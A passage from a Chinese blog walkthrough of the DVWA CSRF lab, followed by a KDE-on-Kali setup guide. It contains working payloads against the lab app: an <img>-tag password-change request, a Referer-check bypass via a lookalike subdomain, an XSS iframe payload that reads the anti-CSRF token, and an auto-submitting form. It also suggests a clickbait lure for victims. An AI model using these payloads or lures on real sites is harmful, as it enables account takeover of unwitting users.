+<p>然后我们需要配置以下 <code>phpstudy</code>  第二域名 (因为默认的代理不抓取 localhost 的数据) 以及本机 <code>HOST</code></p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827093821989.png" alt="image-20220827093821989"></p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827094000330.png" alt="image-20220827094000330"></p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827094310076.png" alt="image-20220827094310076"></p>
+<p>放行后我们的 DVWA 密码就被修改成了 <code>qqqq</code></p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827095422375.png" alt="image-20220827095422375"></p>
+<p><strong>上方为了演示所以构造的 ``html <code>需要点击,我们可以将poc放到</code> <img>` 标签内就不需要点按钮了，只要用户打开就能修改</strong></p>
+<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.86.131/dvwa/vulnerabilities/csrf/?password_new=qqqq&amp;password_conf=qqqq&amp;Change=Change#<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>404 error<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>保存在 <code>poc.html</code>  中，发送给用户触发，我们会发现用户的密码被修改.<strong> 原理：如前面原理部分所说， <code>html</code>  语言的 <code>&lt;img&gt;</code>  标签的 <code>src='url'</code>  可以自动对 <code>url</code>  进行一次 <code>get</code>  请求</strong></p>
+<p><strong>诱导用户访问</strong></p>
+<p>如何诱导用户访问呢？我们只需请出 UC 震惊部的同事就可以了，比如震惊！！汪峰专辑当天爆大瓜，点击链接围观即可:www.vomcentos.com/poc.html, 用户访问此页面后相当于以自己的身份 (有效 cookie) 向服务器发送了一次改密的 get 请求  <code>http://192.168.86.131:8042/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</code> . 而服务端接收了合法用户发起的请求就会执行改密响应，密码即可更改。访问链接完成后，我们重新登录一下，使用我们修改的密码 qqqq 可成功登录，证明了密码已被修改.</p>
+<p><strong>实验结果分析</strong></p>
+<p>利用 <code>&lt;img&gt;</code>  标签来发送 get 请求是在很多场景下都会使用的小技巧，而对于一些如改密等敏感请求如果处理不当，只是简单的凭借 get 请求而不做其他一些验证，就容易被攻击者利用</p>
+<h4 id="中级"><a class="markdownIt-Anchor" href="#中级">#</a> 中级</h4>
+<h5 id="请求分析-2"><a class="markdownIt-Anchor" href="#请求分析-2">#</a> 请求分析</h5>
+<p>请求分析步骤同低级一样，发现没有 <code>token</code>  然后将 <code>refer</code>  删掉看一下</p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827103950739.png" alt="image-20220827103950739"></p>
+<p>可以看到 PHP 报错 <code>PHP Notice:  Undefined index: HTTP_REFERER</code>  大概意思就是请求头中的 referer 不存在</p>
+<p>我们再伪造一个 referer 试一下，结果报错这个请求有点问题</p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827104317186.png" alt="image-20220827104317186"></p>
+<p>接下来我们查看 <code>DVWA CSRF的源码</code> 分析如下:</p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827104442975.png" alt="image-20220827104442975"></p>
+<p>我们看到如下代码</p>
+<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'HTTP_REFERER'</span> <span class="token punctuation">]</span> <span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'SERVER_NAME'</span> <span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>     <span class="token comment"># 代码块</span></pre></td></tr><tr><td data-num="3"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>That request didn't look correct.&lt;/pre>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span>  <span class="token comment"># 获取请求头中的 referer 值也就是来源地址</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_NAME'</span><span class="token punctuation">]</span>   <span class="token comment"># 获取请求头中的 HOST 值如：主机名 / 域名</span></pre></td></tr></table></figure><p><strong>stripos 函数</strong></p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827104852089.png" alt="image-20220827104852089"></p>
+<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">stripos</span> <span class="token punctuation">(</span><span class="token keyword type-declaration">string</span> 字符串<span class="token punctuation">,</span><span class="token keyword type-declaration">string</span> 要查找的内容<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>返回查找的内容的位置<span class="token punctuation">,</span>如果未找到返回<span class="token constant boolean">FALSE</span></pre></td></tr></table></figure><p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827105234534.png" alt="image-20220827105234534"></p>
+<p><strong>找到了并且返回为 8 而不是 FALSE, 也就是说只要 referer 中包含服务器的 HOST 就可以</strong></p>
+<h5 id="构建poc-2"><a class="markdownIt-Anchor" href="#构建poc-2">#</a> 构建 POC</h5>
+<p>这里使用二级域名的方式构建 POC</p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827110025209.png" alt="image-20220827110025209"></p>
+<p><strong>恶意网页的代码还是用的低级中的代码</strong></p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827110213730.png" alt="image-20220827110213730"></p>
+<p>我们可以看到密码修改成功，因为我们的域名中本身就带着靶机的 HOST 所以 stripos 函数可以找到并且条件成立</p>
+<h4 id="高级不可能"><a class="markdownIt-Anchor" href="#高级不可能">#</a> 高级 (不可能)</h4>
+<h5 id="分析"><a class="markdownIt-Anchor" href="#分析">#</a> 分析</h5>
+<p>本步骤将分析请求方式及规则 进行一次正常的改密请求，如下：</p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827110636168.png" alt="image-20220827110636168"></p>
+<p>依旧是 get 请求，而请求中的参数包含了一个名为 <code>user_token</code>  的密文，这就是我们前面原理部分提到过的 token 机制，每一次改密请求 token 都是一个不可预测的随机数，low medium 等级的方法显然不适用了，因为没有 token, 我们发出的请求就是无效的，而 token 是未知且难以预测的，从代码中也可以看出使用了 token 机制.</p>
+<p><strong>值得一提的是:</strong></p>
+<p>​		如果你想用 csrf 去构造一个恶意页面用来偷取访问该页面的用户的 token 的话，我只能告诉你，你是不能成功的，这里牵扯到一个名为 &quot;跨域&quot; 的问题：</p>
+<p>我们的要偷偷访问的地址是 <code>http://192.168.86.131:8042/vulnerabilities/csrf</code>  , 位于服务器  <code>192.168.86.131</code>  上，而我们的攻击页面位于黑客服务器  <code>vmcentos.com</code> （假设）上，两者的域名不同<strong>也不可能伪造一样的域名 (域名是唯一的包括后缀)</strong>, 域名 B 下的所有页面都不允许主动获取域名 A 下的页面内容，除非域名 A 下的页面主动发送信息给域名 B 的页面，所以我们的域是不能主动获取目标域的信息的，只能等待目标域主动发送信息，而对于 <code>user_token</code>  之类的敏感信息，目标域是不会主动发送给我们的。所以我们的攻击脚本是不可能取到改密界面中的 <code>user_token</code>  . 所以，进行到这里，我们判断：仅仅使用 csrf 是得不到用户 token, 也完成不了攻击的！</p>
+<p>本步骤将利用 xss 绕过防御规则 这里需要利用到 high 等级的 xss 漏洞来获取 user_token,payload 如下：</p>
+<p><code>&lt;iframe src='../csrf' onload=alert(frames[0].document.getElementsByName('user_token')[0].value)&gt;</code></p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827112156674.png" alt="image-20220827112156674"></p>
+<p><strong>我获取好多次 token 以下面为准</strong></p>
+<p>而获取 user_token 后，我们就可以重复 low 等级的步骤，只不过改变一下 src 里的利用代码：</p>
+<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.86.131:8042/vulnerabilities/csrf/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token entity" title="&#95;">&amp;#95;</span>new<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>123456<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token entity" title="&#95;">&amp;#95;</span>conf<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>123456<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></pre></td></tr><tr><td data-num="8"></td><td><pre>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Change<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Change<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></pre></td></tr><tr><td data-num="9"></td><td><pre>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token entity" title="&#95;">&amp;#95;</span>token<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>8ecf7635b8b09b6caa0a6e1c98dcecc1<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></pre></td></tr><tr><td data-num="10"></td><td><pre>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>此处 <code>8ecf7635b8b09b6caa0a6e1c98dcecc1</code>  为 <code>xss获</code> 取到的 <code>token</code> , 每一次刷新都在改变，请注意.</p>
+<p>注：形似 <code>8ecf7635b8b09b6caa0a6e1c98dcecc1</code>  的密文为服务端返回的 <code>token</code> , 对于防御机制较为完善的网站来说，用户要进行敏感操作如 <code>支付</code> 、 <code>改密</code> 等时，服务端会发给客户端一个随机数的响应，并且在服务端本身留下此随机数，用户进行敏感操作时必须带上此随机数，如果缺失或者随机数与服务端不匹配，就拒绝该请求.</p>
+<p>接下来即可重复 low 等级步骤，建立 html 文档，诱使合法用户打开实现攻击</p>
+<p><strong>请注意！！当你 xss 弹框出来 token 时请不要返回 csrf 页面，因为在你点击 csrf 进入改密页面时 token 已经再次刷新！！</strong></p>
+<p><strong>因为目前浏览器不支持跨域所以我们的攻击脚本是不可能取到改密界面中的 user_token</strong></p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827161149807.png" alt="image-20220827161149807"></p>
+<h4 id="特高级不可能"><a class="markdownIt-Anchor" href="#特高级不可能">#</a> 特高级 (不可能)</h4>
+<p><strong>DVWA 验证了原始密码，如果攻击者不知道原始密码的情况下不会攻击成功</strong></p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827142747147.png" alt="image-20220827142747147"></p>
+<h2 id="kali桌面美化"><a class="markdownIt-Anchor" href="#kali桌面美化">#</a> Kali 桌面美化</h2>
+<h3 id="运行系统更新"><a class="markdownIt-Anchor" href="#运行系统更新">#</a> 运行系统更新</h3>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt</span> update</pre></td></tr></table></figure><h3 id="为-kali-linux-安装-kde-桌面"><a class="markdownIt-Anchor" href="#为-kali-linux-安装-kde-桌面">#</a> 为 Kali Linux 安装 KDE 桌面</h3>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> kali-desktop-kde</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># 按 Y 并按 Enter 键允许安装。该过程将下载大约 576 MB 的软件包，并且在您的 Kali Linux 上需要大约 2 GB 的可用空间.</span></pre></td></tr></table></figure><p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827162709696.png" alt="image-20220827162709696"></p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827172724340.png" alt="image-20220827172724340"></p>
+<h3 id="选择显示管理器"><a class="markdownIt-Anchor" href="#选择显示管理器">#</a> 选择显示管理器</h3>
+<p>当安装步骤将要求您选择显示管理器以针对您当前的 Dekstop 环境进行配置时，您将有两个选项 Lightdm 和 SDDM, 选择第二个，然后按 Enter 键.</p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827172753505.png" alt="image-20220827172753505"></p>
+<p>在您的系统上安装了一些服务，当某些库需要重新启动时。如 libpam、libc、libssl 等。由于这些重启可能会导致系统的服务中断，通常在每次升级时都会提示您希望重启的服务列表。您可以选择此选项以避免提示；相反，所有必要的重启将为您自动完成，这样您就可以避免在每次库升级时被问到的问题.</p>
+<h3 id="更改-kali-桌面环境"><a class="markdownIt-Anchor" href="#更改-kali-桌面环境">#</a> 更改 Kali 桌面环境</h3>
+<p><strong>更新 x-session-manager</strong></p>
+<p>确保系统能够完美识别更改，并且在重新启动系统后我们将拥有 KDE；更新 Kali Linux 的默认 x-session-manager.</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> update-alternatives <span class="token parameter variable">--config</span> x-session-manager</pre></td></tr></table></figure><p>您将看到所有可用的桌面环境及其优先级，默认情况下，每当我们启动 Kali Linux 时，都会选择 Xfce4 作为 X-session. 因此，要将桌面环境更改为 Kali 上的 KDE, 只需输入分配给 Plasma-X11 的编号.</p>
+<p>例如，这里选择数字为 1 来启动 Plasma, 因此我们输入相同的值并按 Enter 键.</p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827173818260.png" alt="image-20220827173818260"></p>
+<h3 id="重启你的-kali-kde-系统"><a class="markdownIt-Anchor" href="#重启你的-kali-kde-系统">#</a> 重启你的 Kali KDE 系统</h3>
+<p>安装完成后重新启动系统，这一次您将在 Kali Linux 上看到 KDE 等离子登录屏幕.</p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827175230195.png" alt="image-20220827175230195"></p>
+<h3 id="卸载-xfce-或-kde可选"><a class="markdownIt-Anchor" href="#卸载-xfce-或-kde可选">#</a> 卸载 XFCE 或 KDE（可选）</h3>
+<p>现在，您的 Kali Linux 上有两个桌面环境，如果您想删除其中任何一个，可以按照以下命令操作：请记住，<strong> 不要同时运行这两个命令</strong>，否则您将在 Kali Linux 上留下命令行界面.</p>
+<p><strong>删除 XFCE</strong></p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt</span> purge <span class="token parameter variable">--autoremove</span> kali-desktop-xfce</pre></td></tr></table></figure><p><strong>删除 KDE</strong></p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt</span> purge <span class="token parameter variable">--autoremove</span> kali-desktop-kde</pre></td></tr></table></figure><p>运行上述任何命令后，重新启动您的 VM、台式机或笔记本电脑。</p>
+<h3 id="安装-kde-主题"><a class="markdownIt-Anchor" href="#安装-kde-主题">#</a> 安装 KDE 主题</h3>
+<p>这是 KDE 安装完毕之后的几款默认主题</p>
+<p><img data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/image-20220827175823265.png" alt="image-20220827175823265"></p>
+<p><strong>右下角获取新的全局变量</strong>自行安装即可</p>
+
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2022-09-10 09:47:23" itemprop="dateModified" datetime="2022-09-10T09:47:23+08:00">2022-09-10</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>江霁月 <i class="ic i-at"><em>@</em></i>江霁月的私人小屋
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/category/504f59315333.html" title="HTTP&amp;&amp;CSRF">http://example.com/category/504f59315333.html</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/category/cd83d7f3349a.html" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipetfk5zwj20zk0m8e81.jpg" title="Linux基础命令">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> 渗透学习路线</span>
+  <h3>Linux基础命令</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/category/16e5780ab4d0.html" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclhtuo6nj20zk0m8ttm.jpg" title="Dvwa-Xss存储型">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> 渗透学习路线</span>
+  <h3>Dvwa-Xss存储型</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#http%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.</span> <span class="toc-text"> HTTP 协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%A0%87%E8%AE%B0%E5%A4%B4"><span class="toc-number">1.1.</span> <span class="toc-text"> 请求标记头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%8D%E5%BA%94%E7%8A%B6%E6%80%81%E7%A0%81"><span class="toc-number">1.2.</span> <span class="toc-text"> 响应状态码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1xx-%E6%B6%88%E6%81%AF"><span class="toc-number">1.2.0.1.</span> <span class="toc-text"> 1xx 消息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2xx-%E6%88%90%E5%8A%9F"><span class="toc-number">1.2.0.2.</span> <span class="toc-text"> 2xx 成功</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3xx-%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.2.0.3.</span> <span class="toc-text"> 3xx 重定向</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4xx-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%94%99%E8%AF%AF"><span class="toc-number">1.2.0.4.</span> <span class="toc-text"> 4xx 客户端错误</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5xx-%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%94%99%E8%AF%AF"><span class="toc-number">1.2.0.5.</span> <span class="toc-text"> 5xx 服务器错误</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%8D%E5%BA%94%E6%A0%87%E8%AE%B0%E5%A4%B4"><span class="toc-number">1.3.</span> <span class="toc-text"> 响应标记头</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csrf%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text"> CSRF 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text"> 漏洞信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text"> 漏洞利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#csrf%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">2.3.</span> <span class="toc-text"> CSRF 利用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C"><span class="toc-number">2.4.</span> <span class="toc-text"> 漏洞实验</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%8E%E7%BA%A7"><span class="toc-number">2.4.1.</span> <span class="toc-text"> 低级</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E5%88%86%E6%9E%90"><span class="toc-number">2.4.1.1.</span> <span class="toc-text"> 请求分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9E%84%E5%BB%BApoc"><span class="toc-number">2.4.1.2.</span> <span class="toc-text"> 构建 POC</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%AD%E7%BA%A7"><span class="toc-number">2.4.2.</span> <span class="toc-text"> 中级</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E5%88%86%E6%9E%90-2"><span class="toc-number">2.4.2.1.</span> <span class="toc-text"> 请求分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9E%84%E5%BB%BApoc-2"><span class="toc-number">2.4.2.2.</span> <span class="toc-text"> 构建 POC</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7%E4%B8%8D%E5%8F%AF%E8%83%BD"><span class="toc-number">2.4.3.</span> <span class="toc-text"> 高级 (不可能)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.4.3.1.</span> <span class="toc-text"> 分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E9%AB%98%E7%BA%A7%E4%B8%8D%E5%8F%AF%E8%83%BD"><span class="toc-number">2.4.4.</span> <span class="toc-text"> 特高级 (不可能)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kali%E6%A1%8C%E9%9D%A2%E7%BE%8E%E5%8C%96"><span class="toc-number">3.</span> <span class="toc-text"> Kali 桌面美化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%B3%BB%E7%BB%9F%E6%9B%B4%E6%96%B0"><span class="toc-number">3.1.</span> <span class="toc-text"> 运行系统更新</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA-kali-linux-%E5%AE%89%E8%A3%85-kde-%E6%A1%8C%E9%9D%A2"><span class="toc-number">3.2.</span> <span class="toc-text"> 为 Kali Linux 安装 KDE 桌面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E6%98%BE%E7%A4%BA%E7%AE%A1%E7%90%86%E5%99%A8"><span class="toc-number">3.3.</span> <span class="toc-text"> 选择显示管理器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E6%94%B9-kali-%E6%A1%8C%E9%9D%A2%E7%8E%AF%E5%A2%83"><span class="toc-number">3.4.</span> <span class="toc-text"> 更改 Kali 桌面环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E5%90%AF%E4%BD%A0%E7%9A%84-kali-kde-%E7%B3%BB%E7%BB%9F"><span class="toc-number">3.5.</span> <span class="toc-text"> 重启你的 Kali KDE 系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B8%E8%BD%BD-xfce-%E6%88%96-kde%E5%8F%AF%E9%80%89"><span class="toc-number">3.6.</span> <span class="toc-text"> 卸载 XFCE 或 KDE（可选）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-kde-%E4%B8%BB%E9%A2%98"><span class="toc-number">3.7.</span> <span class="toc-text"> 安装 KDE 